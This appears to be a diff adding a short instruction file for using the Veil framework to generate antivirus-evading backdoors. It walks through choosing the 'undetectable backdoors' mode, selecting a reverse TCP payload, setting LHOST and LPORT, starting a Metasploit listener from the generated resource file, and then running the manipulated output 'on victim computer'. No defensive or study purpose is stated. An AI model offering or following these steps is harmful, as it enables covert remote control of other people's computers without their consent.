@@ -1,0 +1,26 @@
+#!veil
+[*]you can run it by simply typing veil
+//you will get option you can update by simple type update
+[*] We will use undetectable backdoors so choose 1
+//you will see available command
+[*] Type list to see available payload
+[*] Now you can choose any thing
+//here i choose 22 reverse tcp
+[*] set LHOST Your IP
+[*] set LPORT // supose 8080
+//you can do modified more type set [option] value 
+[*]Type generate
+//now give any payload name
+//Now you will get there output Metasploit Rsource file written to: 
+//Also you will get something like source code written to:
+
+//open new terminal
+[*] msfconsole --resource copy path inside "Metasploit Rsource file written to" which is on other terminal
+
+//now to see all of jobs
+[*]jobs -l
+//you will see we are listening....
+
+//Now go to output file location is show in  "source code written to:"
+//Manipulate that file and run it on victim computer
+
